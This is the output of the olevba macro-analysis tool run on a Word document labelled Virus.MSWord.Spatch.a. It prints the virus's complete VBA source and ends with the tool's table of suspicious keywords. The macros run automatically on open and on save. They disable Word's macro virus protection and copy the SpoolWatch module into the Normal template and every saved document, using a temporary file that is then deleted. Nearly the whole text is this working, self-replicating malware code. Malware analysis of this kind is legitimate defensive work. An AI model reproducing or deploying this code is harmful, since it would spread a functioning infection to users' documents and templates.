olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Spatch.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Spatch.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO SpoolWatch.bas 
in file: Virus.MSWord.Spatch.a - OLE stream: 'Macros/VBA/SpoolWatch'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub AutoOpen()
Attribute AutoOpen.VB_Description = "Ìàêðîñ ñîçäàí 06.03.02 Sasha"
Attribute AutoOpen.VB_ProcData.VB_Invoke_Func = "Normal.SpoolWatch.AutoOpen"
    Options.VirusProtection = False
    RepToNormal
    RepToDocs
End Sub

Public Sub FileSave()

'End Sub
    Options.VirusProtection = False
    RepToDocs
    ActiveDocument.Save
End Sub

Public Sub RepToNormal()
    Dim ModuleName As String, TMPFile As String
    Dim ModuleExists As Boolean, TMPExists As Boolean
    TMPFile = "C:\Tmp.bas"
    TMPExists = False
    ModuleName = "SpoolWatch"
    For Each VBC In ActiveDocument.VBProject.VBComponents
        If VBC.Name = ModuleName Then
            VBC.Export (TMPFile)
            TMPExists = True
        End If
    Next VBC
    ModuleExists = False
    For Each VBC In Application.NormalTemplate.VBProject.VBComponents
        If VBC.Name = ModuleName Then
            ModuleExists = True
        End If
    Next VBC
    If Not ModuleExists Then
        Application.NormalTemplate.VBProject.VBComponents.Import (TMPFile)
        Application.NormalTemplate.Save
    End If
    If TMPExists Then FileSystem.Kill (TMPFile)
End Sub

Public Sub RepToDocs()
    Dim ModuleName As String, TMPFile As String
    Dim ModuleExists As Boolean, TMPExists As Boolean
    TMPFile = "C:\Tmp.bas"
    TMPExists = False
    ModuleName = "SpoolWatch"
    For Each VBC In Application.NormalTemplate.VBProject.VBComponents
        If VBC.Name = ModuleName Then
            VBC.Export (TMPFile)
            TMPExists = True
        End If
    Next VBC
    ModuleExists = False
    For Each VBC In Application.ActiveDocument.VBProject.VBComponents
        If VBC.Name = ModuleName Then
            ModuleExists = True
        End If
    Next VBC
    If Not ModuleExists Then
        Application.ActiveDocument.VBProject.VBComponents.Import (TMPFile)
        Application.ActiveDocument.Save
    End If
    If TMPExists Then FileSystem.Kill (TMPFile)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

